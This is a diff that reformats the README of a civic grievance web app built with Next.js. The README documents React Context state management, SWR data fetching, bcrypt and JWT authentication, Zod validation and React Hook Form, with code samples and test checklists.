@@ -18,6 +18,7 @@ The system uses modern web technologies to ensure:
 To build a smart, accessible, and accountable grievance redressal system that enhances urban governance by integrating digital tools, automation, and data-driven decision-making.
 
 ### 🚀 Key Features
+
 ## 👤 Citizen Interface
 
 Submit grievances with photos, description, and location
@@ -106,13 +107,14 @@ Privacy compliance (GDPR/local laws)
 
 This project implements a modern state management pattern using React Context API and custom hooks to provide clean, scalable, and maintainable global state management.
 
-| Concept | Purpose | Implementation |
-|---------|---------|----------------|
-| **Context** | Provides a way to pass data through the component tree without prop drilling | Share authentication state and UI preferences across all pages |
-| **Custom Hook** | Encapsulates reusable logic for cleaner components | `useAuth()` and `useUI()` provide elegant interfaces to context data |
-| **Type Safety** | Ensures type correctness with TypeScript | Full TypeScript interfaces for all context values and hooks |
+| Concept         | Purpose                                                                      | Implementation                                                       |
+| --------------- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------- |
+| **Context**     | Provides a way to pass data through the component tree without prop drilling | Share authentication state and UI preferences across all pages       |
+| **Custom Hook** | Encapsulates reusable logic for cleaner components                           | `useAuth()` and `useUI()` provide elegant interfaces to context data |
+| **Type Safety** | Ensures type correctness with TypeScript                                     | Full TypeScript interfaces for all context values and hooks          |
 
 **Key Benefits:**
+
 - 🎯 **Centralized State**: Authentication and UI state managed in one place
 - 🧹 **Clean Components**: No prop drilling, components stay focused
 - 🔄 **Reusability**: Custom hooks provide consistent access patterns
@@ -185,6 +187,7 @@ export function useAuthContext() {
 ```
 
 **Key Features:**
+
 - ✅ Type-safe context with TypeScript interfaces
 - ✅ Error handling for context usage outside provider
 - ✅ Console logging for debugging state transitions
@@ -222,7 +225,9 @@ export function UIProvider({ children }: { children: ReactNode }) {
   };
 
   return (
-    <UIContext.Provider value={{ theme, toggleTheme, sidebarOpen, toggleSidebar }}>
+    <UIContext.Provider
+      value={{ theme, toggleTheme, sidebarOpen, toggleSidebar }}
+    >
       {children}
     </UIContext.Provider>
   );
@@ -238,6 +243,7 @@ export function useUIContext() {
 ```
 
 **Features:**
+
 - 🌓 Theme switching (light/dark mode)
 - 📂 Sidebar state management
 - 🔄 Toggle functions with functional state updates
@@ -267,6 +273,7 @@ export function useAuth() {
 ```
 
 **Benefits:**
+
 - ✅ Adds computed property `isAuthenticated`
 - ✅ Provides clean interface for components
 - ✅ Hides internal context implementation
@@ -300,14 +307,16 @@ export function useUI() {
 import { AuthProvider } from "@/context/AuthContext";
 import { UIProvider } from "@/context/UIContext";
 
-export default function RootLayout({ children }: { children: React.ReactNode }) {
+export default function RootLayout({
+  children,
+}: {
+  children: React.ReactNode;
+}) {
   return (
     <html lang="en">
       <body>
         <AuthProvider>
-          <UIProvider>
-            {children}
-          </UIProvider>
+          <UIProvider>{children}</UIProvider>
         </AuthProvider>
       </body>
     </html>
@@ -316,6 +325,7 @@ export default function RootLayout({ children }: { children: React.ReactNode }) 
 ```
 
 **Architecture:**
+
 - 🔗 Nested providers make both contexts available globally
 - 📦 Context composition pattern for scalability
 - 🎯 Single source of truth for all pages
@@ -336,7 +346,11 @@ export default function Home() {
   const { theme, toggleTheme, sidebarOpen, toggleSidebar } = useUI();
 
   return (
-    <main className={`p-6 ${theme === "dark" ? "bg-gray-900 text-white" : "bg-white text-black"}`}>
+    <main
+      className={`p-6 ${
+        theme === "dark" ? "bg-gray-900 text-white" : "bg-white text-black"
+      }`}
+    >
       <h1>Context & Hooks Demo</h1>
 
       {/* Auth Controls */}
@@ -384,7 +398,9 @@ User logged out
 ### 🔍 Debugging & Performance
 
 #### Debugging Strategies
-1. **React DevTools**: 
+
+1. **React DevTools**:
+
    - Open Components tab
    - Find `AuthProvider` and `UIProvider`
    - Inspect current context values in real-time
@@ -395,11 +411,11 @@ User logged out
 
 #### Performance Optimization
 
-| Strategy | Implementation | Benefit |
-|----------|---------------|---------|
-| **Context Separation** | Separate Auth and UI contexts | Prevents unnecessary re-renders |
-| **React.memo()** | Wrap context consumers | Memoize components that don't need frequent updates |
-| **useCallback()** | Wrap context functions | Prevent function recreation on every render |
+| Strategy               | Implementation                | Benefit                                             |
+| ---------------------- | ----------------------------- | --------------------------------------------------- |
+| **Context Separation** | Separate Auth and UI contexts | Prevents unnecessary re-renders                     |
+| **React.memo()**       | Wrap context consumers        | Memoize components that don't need frequent updates |
+| **useCallback()**      | Wrap context functions        | Prevent function recreation on every render         |
 
 **Example Optimization:**
 
@@ -418,15 +434,13 @@ const login = useCallback((username: string) => {
 For complex state management, you can upgrade to `useReducer`:
 
 ```typescript
-type Action = 
-  | { type: 'LOGIN'; payload: string }
-  | { type: 'LOGOUT' };
+type Action = { type: "LOGIN"; payload: string } | { type: "LOGOUT" };
 
 const authReducer = (state: AuthState, action: Action) => {
   switch (action.type) {
-    case 'LOGIN':
+    case "LOGIN":
       return { user: action.payload };
-    case 'LOGOUT':
+    case "LOGOUT":
       return { user: null };
     default:
       return state;
@@ -438,6 +452,7 @@ const [state, dispatch] = useReducer(authReducer, { user: null });
 ```
 
 **Benefits:**
+
 - 📋 Predictable state transitions
 - 🔍 Easier to debug complex flows
 - 🧪 Better testability
@@ -480,16 +495,19 @@ const [state, dispatch] = useReducer(authReducer, { user: null });
 ### 📸 Expected Behavior
 
 **Login Flow:**
+
 1. Click "Login as KalviumUser"
 2. Console: `User logged in: KalviumUser`
 3. UI updates to show logged-in state
 
 **Theme Toggle:**
+
 1. Click "Toggle Theme"
 2. Background changes from light to dark
 3. All components respond to theme change
 
 **Sidebar Toggle:**
+
 1. Click "Open Sidebar"
 2. Sidebar state updates
 3. UI reflects open/closed status
@@ -499,22 +517,26 @@ const [state, dispatch] = useReducer(authReducer, { user: null });
 ### 🛠️ How to Test
 
 1. **Start Development Server:**
+
    ```bash
    cd ttaurban
    npm run dev
    ```
 
 2. **Open Browser:**
+
    - Navigate to `http://localhost:3000`
    - Open Developer Console (F12)
 
 3. **Test Authentication:**
+
    - Click "Login" button
    - Check console for "User logged in: KalviumUser"
    - Verify UI shows logged-in state
    - Click "Logout" and verify state change
 
 4. **Test UI Controls:**
+
    - Toggle theme and observe background color change
    - Toggle sidebar and check state updates
    - Monitor console for all state changes
@@ -538,12 +560,12 @@ const [state, dispatch] = useReducer(authReducer, { user: null });
 
 **Potential Pitfalls & Solutions:**
 
-| Pitfall | Solution |
-|---------|----------|
-| Too many re-renders | Separate contexts by concern |
-| Context value changes too often | Use useCallback/useMemo |
-| Large context values | Split into smaller contexts |
-| Testing difficulty | Export context for testing |
+| Pitfall                         | Solution                     |
+| ------------------------------- | ---------------------------- |
+| Too many re-renders             | Separate contexts by concern |
+| Context value changes too often | Use useCallback/useMemo      |
+| Large context values            | Split into smaller contexts  |
+| Testing difficulty              | Export context for testing   |
 
 ---
 
@@ -568,14 +590,14 @@ This project implements efficient client-side data fetching using **SWR (stale-w
 
 ### 🎯 Why SWR?
 
-| Concept | Description | Benefit |
-|---------|-------------|---------|
-| **Stale-While-Revalidate** | Returns cached data immediately, then fetches fresh data in background | Instant UI updates |
-| **Automatic Caching** | Avoids redundant network requests by reusing data | Reduced API calls |
-| **Auto-Revalidation** | Refreshes data on focus, reconnect, or intervals | Always up-to-date |
-| **Optimistic UI** | Updates UI before server confirmation | Better UX |
-| **Error Retry** | Automatically retries failed requests | Improved reliability |
-| **TypeScript Support** | Full type safety out of the box | Fewer bugs |
+| Concept                    | Description                                                            | Benefit              |
+| -------------------------- | ---------------------------------------------------------------------- | -------------------- |
+| **Stale-While-Revalidate** | Returns cached data immediately, then fetches fresh data in background | Instant UI updates   |
+| **Automatic Caching**      | Avoids redundant network requests by reusing data                      | Reduced API calls    |
+| **Auto-Revalidation**      | Refreshes data on focus, reconnect, or intervals                       | Always up-to-date    |
+| **Optimistic UI**          | Updates UI before server confirmation                                  | Better UX            |
+| **Error Retry**            | Automatically retries failed requests                                  | Improved reliability |
+| **TypeScript Support**     | Full type safety out of the box                                        | Fewer bugs           |
 
 ---
 
@@ -618,14 +640,14 @@ ttaurban/
  */
 export const fetcher = async (url: string) => {
   const res = await fetch(url);
-  
+
   if (!res.ok) {
     const error = new Error("Failed to fetch data");
     (error as any).info = await res.json().catch(() => ({}));
     (error as any).status = res.status;
     throw error;
   }
-  
+
   return res.json();
 };
 
@@ -634,26 +656,27 @@ export const fetcher = async (url: string) => {
  */
 export const authenticatedFetcher = async (url: string) => {
   const token = localStorage.getItem("token");
-  
+
   const res = await fetch(url, {
     headers: {
       Authorization: token ? `Bearer ${token}` : "",
       "Content-Type": "application/json",
     },
   });
-  
+
   if (!res.ok) {
     const error = new Error("Failed to fetch data");
     (error as any).info = await res.json().catch(() => ({}));
     (error as any).status = res.status;
     throw error;
   }
-  
+
   return res.json();
 };
 ```
 
 **Key Features:**
+
 - ✅ Error handling with status codes
 - ✅ JSON parsing with fallback
 - ✅ Authentication support
@@ -674,13 +697,13 @@ export default function SWRProvider({ children }: { children: ReactNode }) {
   return (
     <SWRConfig
       value={{
-        fetcher,                        // Default fetcher
-        revalidateOnFocus: true,        // Refetch on tab focus
-        revalidateOnReconnect: true,    // Refetch on network reconnect
-        errorRetryCount: 3,             // Retry 3 times on error
-        errorRetryInterval: 2000,       // 2s between retries
-        dedupingInterval: 2000,         // Dedupe requests within 2s
-        focusThrottleInterval: 5000,    // Throttle focus revalidation
+        fetcher, // Default fetcher
+        revalidateOnFocus: true, // Refetch on tab focus
+        revalidateOnReconnect: true, // Refetch on network reconnect
+        errorRetryCount: 3, // Retry 3 times on error
+        errorRetryInterval: 2000, // 2s between retries
+        dedupingInterval: 2000, // Dedupe requests within 2s
+        focusThrottleInterval: 5000, // Throttle focus revalidation
       }}
     >
       {children}
@@ -699,9 +722,7 @@ export default function RootLayout({ children }) {
   return (
     <html>
       <body>
-        <SWRProvider>
-          {children}
-        </SWRProvider>
+        <SWRProvider>{children}</SWRProvider>
       </body>
     </html>
   );
@@ -730,7 +751,9 @@ export default function UsersPage() {
       <h1>User List</h1>
       <ul>
         {data.users.map((user: any) => (
-          <li key={user.id}>{user.name} — {user.email}</li>
+          <li key={user.id}>
+            {user.name} — {user.email}
+          </li>
         ))}
       </ul>
     </div>
@@ -739,6 +762,7 @@ export default function UsersPage() {
 ```
 
 **What Happens:**
+
 1. ✅ SWR checks cache for `/api/users`
 2. ✅ Returns cached data immediately (if available)
 3. ✅ Fetches fresh data in background
@@ -762,6 +786,7 @@ useSWR(shouldFetch ? "/api/data" : null, fetcher);
 ```
 
 **Key Rules:**
+
 - String keys map to API endpoints
 - `null` pauses fetching
 - Keys can include query parameters: `/api/users?page=2`
@@ -783,7 +808,7 @@ export default function AddUser() {
   const addUser = async () => {
     // Step 1: Optimistic update (instant UI change)
     const tempUser = { id: Date.now(), name, email: "temp@user.com" };
-    
+
     mutate(
       "/api/users",
       (current: any) => ({
@@ -816,6 +841,7 @@ export default function AddUser() {
 ```
 
 **Optimistic UI Flow:**
+
 1. ⚡ Update UI instantly
 2. 📡 Send request to API
 3. 🔄 Revalidate when response arrives
@@ -829,11 +855,11 @@ export default function AddUser() {
 
 ```typescript
 const { data } = useSWR("/api/users", fetcher, {
-  revalidateOnFocus: true,      // Refetch when tab regains focus
-  revalidateOnReconnect: true,  // Refetch when network reconnects
-  refreshInterval: 10000,       // Auto-refresh every 10 seconds
-  dedupingInterval: 2000,       // Dedupe requests within 2 seconds
-  
+  revalidateOnFocus: true, // Refetch when tab regains focus
+  revalidateOnReconnect: true, // Refetch when network reconnects
+  refreshInterval: 10000, // Auto-refresh every 10 seconds
+  dedupingInterval: 2000, // Dedupe requests within 2 seconds
+
   // Custom error retry
   onErrorRetry: (error, key, config, revalidate, { retryCount }) => {
     if (retryCount >= 3) return; // Stop after 3 retries
@@ -878,6 +904,7 @@ export default function CacheDemoPage() {
 ```
 
 **Cache Behavior:**
+
 - **Cache Hit** ⚡: Data exists → return instantly → revalidate in background
 - **Cache Miss** 🐌: No data → show loading → fetch from API → cache result
 
@@ -885,16 +912,16 @@ export default function CacheDemoPage() {
 
 ### 📊 SWR vs Traditional Fetch
 
-| Feature | SWR | Fetch API |
-|---------|-----|-----------|
-| Built-in cache | ✅ | ❌ |
-| Auto-revalidation | ✅ | ❌ |
-| Optimistic UI | ✅ | ❌ Manual |
-| Error retry | ✅ Automatic | ❌ Manual |
-| Focus revalidation | ✅ | ❌ |
-| TypeScript support | ✅ | ⚠️ Partial |
-| Deduplication | ✅ | ❌ |
-| Loading states | ✅ Built-in | ❌ Manual |
+| Feature            | SWR          | Fetch API  |
+| ------------------ | ------------ | ---------- |
+| Built-in cache     | ✅           | ❌         |
+| Auto-revalidation  | ✅           | ❌         |
+| Optimistic UI      | ✅           | ❌ Manual  |
+| Error retry        | ✅ Automatic | ❌ Manual  |
+| Focus revalidation | ✅           | ❌         |
+| TypeScript support | ✅           | ⚠️ Partial |
+| Deduplication      | ✅           | ❌         |
+| Loading states     | ✅ Built-in  | ❌ Manual  |
 
 ---
 
@@ -903,21 +930,25 @@ export default function CacheDemoPage() {
 **Test Checklist:**
 
 1. ✅ **Cache Hit Test**
+
    - Navigate to `/users`
    - Switch to another page
    - Return to `/users` → Data loads instantly (cached!)
 
 2. ✅ **Revalidation Test**
+
    - Open `/users` in one tab
    - Add a user in another tab
    - Switch back → SWR refetches and updates
 
 3. ✅ **Optimistic UI Test**
+
    - Add a new user
    - User appears instantly before API responds
    - Syncs with server when response arrives
 
 4. ✅ **Error Handling**
+
    - Disconnect network
    - Try fetching data
    - SWR retries automatically (check console)
@@ -932,12 +963,14 @@ export default function CacheDemoPage() {
 ### 📈 Performance Improvements
 
 **Before SWR:**
+
 - ❌ Every page visit = new API call
 - ❌ Loading spinner on every navigation
 - ❌ Wasted bandwidth on redundant requests
 - ❌ Poor offline experience
 
 **After SWR:**
+
 - ✅ Instant page loads from cache
 - ✅ Background revalidation keeps data fresh
 - ✅ Reduced API calls (deduplicated)
@@ -947,19 +980,20 @@ export default function CacheDemoPage() {
 
 ### 🎯 Real-World Use Cases
 
-| Scenario | SWR Strategy |
-|----------|--------------|
-| User dashboard | `revalidateOnFocus: true` |
-| Real-time data | `refreshInterval: 5000` |
-| Search results | `dedupingInterval: 1000` |
-| Forms | Optimistic updates with `mutate()` |
-| Public data | Long cache with manual revalidation |
+| Scenario       | SWR Strategy                        |
+| -------------- | ----------------------------------- |
+| User dashboard | `revalidateOnFocus: true`           |
+| Real-time data | `refreshInterval: 5000`             |
+| Search results | `dedupingInterval: 1000`            |
+| Forms          | Optimistic updates with `mutate()`  |
+| Public data    | Long cache with manual revalidation |
 
 ---
 
 ### 🛠️ Debugging Tips
 
 **1. Enable SWR DevTools:**
+
 ```typescript
 // In SWRConfig
 onSuccess: (data, key) => {
@@ -971,16 +1005,18 @@ onError: (error, key) => {
 ```
 
 **2. Inspect Cache:**
+
 ```typescript
 const { cache } = useSWRConfig();
 console.log("Cache size:", cache.keys().length);
 ```
 
 **3. Force Revalidation:**
+
 ```typescript
 import { mutate } from "swr";
 mutate("/api/users"); // Revalidate specific key
-mutate(() => true);   // Revalidate ALL keys
+mutate(() => true); // Revalidate ALL keys
 ```
 
 ---
@@ -1024,6 +1060,7 @@ mutate(() => true);   // Revalidate ALL keys
 This project implements **secure authentication** using **bcrypt** for password hashing and **JWT (JSON Web Tokens)** for stateless session management.
 
 ### Key Features
+
 - ✅ **Secure Password Storage** - bcrypt hashing with 10 salt rounds
 - ✅ **JWT-based Authentication** - Stateless token system
 - ✅ **Token Expiration** - 1-hour token lifetime
@@ -1034,9 +1071,11 @@ This project implements **secure authentication** using **bcrypt** for password 
 ### Authentication Endpoints
 
 #### 🔐 Signup - `/api/auth/signup` (POST)
+
 Register a new user with hashed password.
 
 **Request:**
+
 ```json
 {
   "name": "Alice Johnson",
@@ -1047,6 +1086,7 @@ Register a new user with hashed password.
 ```
 
 **Response (201):**
+
 ```json
 {
   "success": true,
@@ -1061,9 +1101,11 @@ Register a new user with hashed password.
 ```
 
 #### 🔓 Login - `/api/auth/login` (POST)
+
 Authenticate and receive JWT token.
 
 **Request:**
+
 ```json
 {
   "email": "alice@example.com",
@@ -1072,6 +1114,7 @@ Authenticate and receive JWT token.
 ```
 
 **Response (200):**
+
 ```json
 {
   "success": true,
@@ -1087,14 +1130,17 @@ Authenticate and receive JWT token.
 ```
 
 #### 👤 Get Current User - `/api/auth/me` (GET)
+
 Get authenticated user info (protected route).
 
 **Headers:**
+
 ```
 Authorization: Bearer <your_jwt_token>
 ```
 
 **Response (200):**
+
 ```json
 {
   "success": true,
@@ -1111,6 +1157,7 @@ Authorization: Bearer <your_jwt_token>
 ### Security Implementation
 
 **Password Hashing:**
+
 ```typescript
 // During signup
 const hashedPassword = await bcrypt.hash(password, 10);
@@ -1120,6 +1167,7 @@ const isValid = await bcrypt.compare(password, hashedPassword);
 ```
 
 **JWT Token Generation:**
+
 ```typescript
 const token = jwt.sign(
   { id: user.id, email: user.email, role: user.role },
@@ -1129,13 +1177,14 @@ const token = jwt.sign(
 ```
 
 **Protecting Routes:**
+
 ```typescript
 import { verifyToken, unauthorizedResponse } from "@/lib/auth";
 
 export async function GET(req: Request) {
   const user = verifyToken(req);
   if (!user) return unauthorizedResponse();
-  
+
   // Proceed with authenticated logic
 }
 ```
@@ -1143,11 +1192,13 @@ export async function GET(req: Request) {
 ### Environment Setup
 
 Add to `.env.local`:
+
 ```env
 JWT_SECRET=your_super_secure_random_string_here
 ```
 
 **Generate a secure secret:**
+
 ```bash
 node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
 ```
@@ -1163,11 +1214,13 @@ This project implements **TypeScript-first schema validation** using [Zod](https
 ### Why Input Validation Matters
 
 Every API needs to **trust but verify** the data it receives. Without validation:
+
 - ❌ Users might send malformed JSON or missing fields
 - ❌ The database could receive invalid or unexpected values
 - ❌ The application becomes unpredictable or insecure
 
 **Example Problem:**
+
 ```json
 {
   "name": "",
@@ -1192,25 +1245,39 @@ export const createUserSchema = z.object({
   name: z.string().min(2).max(100),
   email: z.string().email(),
   password: z.string().min(8).max(128),
-  phone: z.string().regex(/^\+?[1-9]\d{1,14}$/).optional().nullable(),
+  phone: z
+    .string()
+    .regex(/^\+?[1-9]\d{1,14}$/)
+    .optional()
+    .nullable(),
   role: z.enum(["CITIZEN", "OFFICER", "ADMIN"]).default("CITIZEN"),
 });
 
 export const updateUserSchema = z.object({
   name: z.string().min(2).max(100),
   email: z.string().email(),
-  phone: z.string().regex(/^\+?[1-9]\d{1,14}$/).optional().nullable(),
+  phone: z
+    .string()
+    .regex(/^\+?[1-9]\d{1,14}$/)
+    .optional()
+    .nullable(),
   role: z.enum(["CITIZEN", "OFFICER", "ADMIN"]).optional(),
 });
 
-export const patchUserSchema = z.object({
-  name: z.string().min(2).max(100).optional(),
-  email: z.string().email().optional(),
-  phone: z.string().regex(/^\+?[1-9]\d{1,14}$/).optional().nullable(),
-  role: z.enum(["CITIZEN", "OFFICER", "ADMIN"]).optional(),
-}).refine((data) => Object.keys(data).length > 0, {
-  message: "At least one field must be provided for update",
-});
+export const patchUserSchema = z
+  .object({
+    name: z.string().min(2).max(100).optional(),
+    email: z.string().email().optional(),
+    phone: z
+      .string()
+      .regex(/^\+?[1-9]\d{1,14}$/)
+      .optional()
+      .nullable(),
+    role: z.enum(["CITIZEN", "OFFICER", "ADMIN"]).optional(),
+  })
+  .refine((data) => Object.keys(data).length > 0, {
+    message: "At least one field must be provided for update",
+  });
 
 export type CreateUserInput = z.infer<typeof createUserSchema>;
 export type UpdateUserInput = z.infer<typeof updateUserSchema>;
@@ -1230,12 +1297,14 @@ export const updateDepartmentSchema = z.object({
   description: z.string().max(500).optional().nullable(),
 });
 
-export const patchDepartmentSchema = z.object({
-  name: z.string().min(3).max(100).optional(),
-  description: z.string().max(500).optional().nullable(),
-}).refine((data) => Object.keys(data).length > 0, {
-  message: "At least one field must be provided for update",
-});
+export const patchDepartmentSchema = z
+  .object({
+    name: z.string().min(3).max(100).optional(),
+    description: z.string().max(500).optional().nullable(),
+  })
+  .refine((data) => Object.keys(data).length > 0, {
+    message: "At least one field must be provided for update",
+  });
 ```
 
 #### 📁 Complaint Schema ([`complaintSchema.ts`](ttaurban/app/lib/schemas/complaintSchema.ts))
@@ -1252,7 +1321,7 @@ export const createComplaintSchema = z.object({
     "STREET_LIGHTS",
     "DRAINAGE",
     "PUBLIC_SAFETY",
-    "OTHER"
+    "OTHER",
   ]),
   priority: z.enum(["LOW", "MEDIUM", "HIGH", "CRITICAL"]).default("MEDIUM"),
   latitude: z.number().min(-90).max(90).optional().nullable(),
@@ -1279,19 +1348,23 @@ import { ZodError } from "zod";
 export async function POST(req: Request) {
   try {
     const body = await req.json();
-    
+
     // ✅ Zod Validation
     const validatedData = createUserSchema.parse(body);
-    
+
     // Check if email already exists
     const existingUser = await prisma.user.findUnique({
       where: { email: validatedData.email },
     });
-    
+
     if (existingUser) {
-      return sendError("Email already registered", ERROR_CODES.EMAIL_ALREADY_EXISTS, 409);
+      return sendError(
+        "Email already registered",
+        ERROR_CODES.EMAIL_ALREADY_EXISTS,
+        409
+      );
     }
-    
+
     // Create user with validated data
     const user = await prisma.user.create({
       data: {
@@ -1302,7 +1375,7 @@ export async function POST(req: Request) {
         role: validatedData.role,
       },
     });
-    
+
     return sendSuccess(user, "User created successfully", 201);
   } catch (error) {
     // Handle Zod validation errors
@@ -1319,8 +1392,13 @@ export async function POST(req: Request) {
         { status: 400 }
       );
     }
-    
-    return sendError("Failed to create user", ERROR_CODES.USER_CREATION_FAILED, 500, error);
+
+    return sendError(
+      "Failed to create user",
+      ERROR_CODES.USER_CREATION_FAILED,
+      500,
+      error
+    );
   }
 }
 ```
@@ -1375,6 +1453,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Response:**
+
 ```json
 {
   "success": true,
@@ -1403,6 +1482,7 @@ curl -X POST http://localhost:3000/api/users \
 ```
 
 **Response:**
+
 ```json
 {
   "success": false,
@@ -1483,11 +1563,11 @@ This project implements **production-grade form management** using **React Hook 
 
 ### 🎯 Why React Hook Form + Zod?
 
-| Tool | Purpose | Key Benefit |
-|------|---------|-------------|
-| **React Hook Form** | Manages form state and validation with minimal re-renders | Lightweight and performant |
-| **Zod** | Provides declarative schema validation | Type-safe and reusable schemas |
-| **@hookform/resolvers** | Connects Zod to React Hook Form seamlessly | Simplifies schema integration |
+| Tool                    | Purpose                                                   | Key Benefit                    |
+| ----------------------- | --------------------------------------------------------- | ------------------------------ |
+| **React Hook Form**     | Manages form state and validation with minimal re-renders | Lightweight and performant     |
+| **Zod**                 | Provides declarative schema validation                    | Type-safe and reusable schemas |
+| **@hookform/resolvers** | Connects Zod to React Hook Form seamlessly                | Simplifies schema integration  |
 
 **Key Idea:** React Hook Form optimizes rendering and state management, while Zod enforces correctness through schemas.
 
@@ -1591,6 +1671,7 @@ export default function FormInput({
 ```
 
 **Features:**
+
 - ✅ **Accessibility**: Associated labels, ARIA attributes, and semantic HTML
 - ✅ **Error Feedback**: Visual error states with icons and descriptive messages
 - ✅ **Reusability**: Generic interface works with any form
@@ -1710,6 +1791,7 @@ export default function SignupPage() {
 ```
 
 **Validation Features:**
+
 - ✅ **Name**: 3-50 characters
 - ✅ **Email**: Valid email format
 - ✅ **Password**: Min 6 characters, must contain uppercase, lowercase, and number
@@ -1804,7 +1886,9 @@ export default function ContactPage() {
             }`}
           />
           {errors.message && (
-            <p className="text-red-500 text-sm mt-1">{errors.message.message}</p>
+            <p className="text-red-500 text-sm mt-1">
+              {errors.message.message}
+            </p>
           )}
         </div>
 
@@ -1825,6 +1909,7 @@ export default function ContactPage() {
 ### 🎨 Key Concepts Demonstrated
 
 #### 1. **Schema-First Validation**
+
 ```typescript
 const schema = z.object({
   email: z.string().email("Invalid email"),
@@ -1833,18 +1918,25 @@ const schema = z.object({
 ```
 
 #### 2. **Type Inference**
+
 ```typescript
 type FormData = z.infer<typeof schema>; // Automatic TypeScript types
 ```
 
 #### 3. **React Hook Form Integration**
+
 ```typescript
-const { register, handleSubmit, formState: { errors } } = useForm<FormData>({
+const {
+  register,
+  handleSubmit,
+  formState: { errors },
+} = useForm<FormData>({
   resolver: zodResolver(schema),
 });
 ```
 
 #### 4. **Cross-Field Validation**
+
 ```typescript
 .refine((data) => data.password === data.confirmPassword, {
   message: "Passwords do not match",
@@ -1856,14 +1948,14 @@ const { register, handleSubmit, formState: { errors } } = useForm<FormData>({
 
 ### ♿ Accessibility & UX Best Practices
 
-| Practice | Implementation | Benefit |
-|----------|----------------|---------|
-| **Label Association** | `<label htmlFor={name}>` with `id={name}` on input | Screen reader support |
-| **ARIA Attributes** | `aria-invalid`, `aria-describedby` | Enhanced accessibility |
-| **Error Messaging** | `role="alert"` on error text | Screen readers announce errors |
-| **Visual Feedback** | Color-coded borders, icons | Clear error indication |
-| **Loading States** | `disabled={isSubmitting}` with text change | Prevents double submissions |
-| **Keyboard Navigation** | Semantic HTML with proper tab order | Accessible without mouse |
+| Practice                | Implementation                                     | Benefit                        |
+| ----------------------- | -------------------------------------------------- | ------------------------------ |
+| **Label Association**   | `<label htmlFor={name}>` with `id={name}` on input | Screen reader support          |
+| **ARIA Attributes**     | `aria-invalid`, `aria-describedby`                 | Enhanced accessibility         |
+| **Error Messaging**     | `role="alert"` on error text                       | Screen readers announce errors |
+| **Visual Feedback**     | Color-coded borders, icons                         | Clear error indication         |
+| **Loading States**      | `disabled={isSubmitting}` with text change         | Prevents double submissions    |
+| **Keyboard Navigation** | Semantic HTML with proper tab order                | Accessible without mouse       |
 
 ---
 
@@ -1879,11 +1971,11 @@ React Hook Form provides exceptional performance through:
 
 **Comparison:**
 
-| Approach | Re-renders on Input | Bundle Size |
-|----------|---------------------|-------------|
-| React Hook Form | 0-1 per field | 9kb |
-| Formik | 1+ per keystroke | 13kb |
-| Manual State | 1 per keystroke | 0kb (but complex) |
+| Approach        | Re-renders on Input | Bundle Size       |
+| --------------- | ------------------- | ----------------- |
+| React Hook Form | 0-1 per field       | 9kb               |
+| Formik          | 1+ per keystroke    | 13kb              |
+| Manual State    | 1 per keystroke     | 0kb (but complex) |
 
 ---
 
@@ -1892,15 +1984,17 @@ React Hook Form provides exceptional performance through:
 React Hook Form provides rich form state:
 
 ```typescript
-const { formState: { 
-  errors,           // Validation errors
-  isSubmitting,     // Submission in progress
-  isValid,          // Form is valid
-  isDirty,          // Form has been modified
-  dirtyFields,      // Which fields changed
-  touchedFields,    // Which fields were focused
-  isSubmitted,      // Form was submitted
-}} = useForm();
+const {
+  formState: {
+    errors, // Validation errors
+    isSubmitting, // Submission in progress
+    isValid, // Form is valid
+    isDirty, // Form has been modified
+    dirtyFields, // Which fields changed
+    touchedFields, // Which fields were focused
+    isSubmitted, // Form was submitted
+  },
+} = useForm();
 ```
 
 ---
@@ -1910,33 +2004,45 @@ const { formState: {
 Example test for signup form:
 
 ```typescript
-import { render, screen, fireEvent, waitFor } from '@testing-library/react';
-import SignupPage from './page';
+import { render, screen, fireEvent, waitFor } from "@testing-library/react";
+import SignupPage from "./page";
 
-test('shows validation errors for invalid inputs', async () => {
+test("shows validation errors for invalid inputs", async () => {
   render(<SignupPage />);
-  
-  const submitButton = screen.getByRole('button', { name: /sign up/i });
+
+  const submitButton = screen.getByRole("button", { name: /sign up/i });
   fireEvent.click(submitButton);
-  
+
   await waitFor(() => {
-    expect(screen.getByText(/name must be at least 3 characters/i)).toBeInTheDocument();
+    expect(
+      screen.getByText(/name must be at least 3 characters/i)
+    ).toBeInTheDocument();
     expect(screen.getByText(/invalid email/i)).toBeInTheDocument();
   });
 });
 
-test('submits form with valid data', async () => {
+test("submits form with valid data", async () => {
   render(<SignupPage />);
-  
-  fireEvent.change(screen.getByLabelText(/name/i), { target: { value: 'John Doe' } });
-  fireEvent.change(screen.getByLabelText(/email/i), { target: { value: 'john@example.com' } });
-  fireEvent.change(screen.getByLabelText(/^password/i), { target: { value: 'Pass123' } });
-  fireEvent.change(screen.getByLabelText(/confirm password/i), { target: { value: 'Pass123' } });
-  
-  fireEvent.click(screen.getByRole('button', { name: /sign up/i }));
-  
+
+  fireEvent.change(screen.getByLabelText(/name/i), {
+    target: { value: "John Doe" },
+  });
+  fireEvent.change(screen.getByLabelText(/email/i), {
+    target: { value: "john@example.com" },
+  });
+  fireEvent.change(screen.getByLabelText(/^password/i), {
+    target: { value: "Pass123" },
+  });
+  fireEvent.change(screen.getByLabelText(/confirm password/i), {
+    target: { value: "Pass123" },
+  });
+
+  fireEvent.click(screen.getByRole("button", { name: /sign up/i }));
+
   await waitFor(() => {
-    expect(console.log).toHaveBeenCalledWith(expect.stringContaining('Form Submitted'));
+    expect(console.log).toHaveBeenCalledWith(
+      expect.stringContaining("Form Submitted")
+    );
   });
 });
 ```
@@ -1945,14 +2051,14 @@ test('submits form with valid data', async () => {
 
 ### 📊 Real-World Use Cases
 
-| Use Case | Implementation |
-|----------|----------------|
-| **Multi-step Forms** | Use `watch()` to track progress, conditional rendering |
-| **Dynamic Fields** | Use `useFieldArray()` for adding/removing fields |
-| **Async Validation** | Check email uniqueness with debounced API calls |
-| **File Uploads** | Validate file size/type with custom Zod schemas |
-| **Conditional Validation** | Use `.refine()` for business logic rules |
-| **International Forms** | Integrate with i18n for multilingual error messages |
+| Use Case                   | Implementation                                         |
+| -------------------------- | ------------------------------------------------------ |
+| **Multi-step Forms**       | Use `watch()` to track progress, conditional rendering |
+| **Dynamic Fields**         | Use `useFieldArray()` for adding/removing fields       |
+| **Async Validation**       | Check email uniqueness with debounced API calls        |
+| **File Uploads**           | Validate file size/type with custom Zod schemas        |
+| **Conditional Validation** | Use `.refine()` for business logic rules               |
+| **International Forms**    | Integrate with i18n for multilingual error messages    |
 
 ---
 
